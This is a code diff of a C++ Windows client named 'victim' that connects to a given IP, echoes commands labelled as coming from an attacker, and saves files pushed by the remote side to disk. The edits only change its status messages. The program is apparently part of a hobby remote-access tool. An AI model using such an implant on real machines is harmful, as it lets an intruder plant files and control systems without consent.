@@ -7,7 +7,7 @@
 
 int main(int argc, char* argv[]) {
     if(argc < 2) {
-        std::cout << ARGV_ERROR << std::endl;
+        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
         return 1;
     }
     sockaddr_in serverAddress;
@@ -16,19 +16,19 @@ int main(int argc, char* argv[]) {
     SOCKET sock = INVALID_SOCKET;
 
     if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
-        perror(WSA_FAIL);
+        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
         return 1;
     } else {
-        std::cout << WSA_SUCCESS;
+        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
     }
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock == INVALID_SOCKET) {
-        perror(SOCKET_FAIL);
+        std::cout << ERROR_PREFIX << " Socket failed\n";
         WSACleanup();
         return 1;
     } else {
-        std::cout << SOCKET_SUCCESS;
+        std::cout << SUCCESS_PREFIX << " Socket created\n";
     }
 
     serverAddress.sin_family = AF_INET;
@@ -37,17 +37,17 @@ int main(int argc, char* argv[]) {
     std::string serverip = argv[1];
 
     if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
-        std::cout << INVALID_IP;
+        std::cout << ERROR_PREFIX << " Invalid IP address\n";
         return 1;
     }
 
     if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
-        std::cout << CONNECTION_FAIL;
+        std::cout << ERROR_PREFIX << " Connection failed\n";
         closesocket(sock);
         WSACleanup();
         return 1;
     } else {
-        std::cout << CONNECTION_ESTABLISHED;
+        std::cout << SUCCESS_PREFIX << " Connection established\n";
     }
 
     while(true) {
@@ -69,7 +69,7 @@ int main(int argc, char* argv[]) {
             std::string cmd(buffer);
             std::cout << ATTACKER_LABEL << cmd << std::endl;
 
-            std::string clientMessage = "Client received: " + cmd + '\n';
+            std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
             send(sock, clientMessage.c_str(), clientMessage.size(), 0);
         
         }
@@ -78,14 +78,14 @@ int main(int argc, char* argv[]) {
             int64_t fileSize;
             bytesRec = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
             if(bytesRec < 0 || fileSize < 0) {
-                std::cout << FILE_INFORMATION_FAIL;
+                std::cout << ERROR_PREFIX << " Cannot receive file information\n";
                 continue;
             }
 
             int32_t fileNameLeng;
             bytesRec = recv(sock, (char*)&fileNameLeng, sizeof(fileNameLeng), 0);
             if (bytesRec <= 0) {
-                std::cout << FILE_NAME_FAIL;
+                std::cout << ERROR_PREFIX << " Cannot receive file name length\n";
                 continue;
             }
 
@@ -98,12 +98,12 @@ int main(int argc, char* argv[]) {
             char c[BUFFERSIZE];
             _getcwd(c, sizeof(c));
             std::string path = std::string(c) + "\\" + filename;
-            std::cout << RECEIVED_FILE << filename << std::endl;
-            std::cout << SAVING_FILE << path << std::endl;
+            std::cout << SUCCESS_PREFIX << " Received file: '" << filename << "'" << std::endl;
+            std::cout << PENDING_PREFIX << " Saving file to: " << path << std::endl;
 
             FILE* fileOutput = fopen(path.c_str(), "wb");
             if(!fileOutput) {
-                std::cout << "\033[31mCannot create file\033[0m\n";
+                std::cout << ERROR_PREFIX << " Cannot create file\n";
                 continue;
             }
         
@@ -116,6 +116,7 @@ int main(int argc, char* argv[]) {
                 }
                 fwrite(buffer, 1, bytesRec, fileOutput);
                 dataRec += bytesRec;
+                std::cout << SUCCESS_PREFIX << " Saved file to: " << path << std::endl;
             }
 
             fclose(fileOutput);
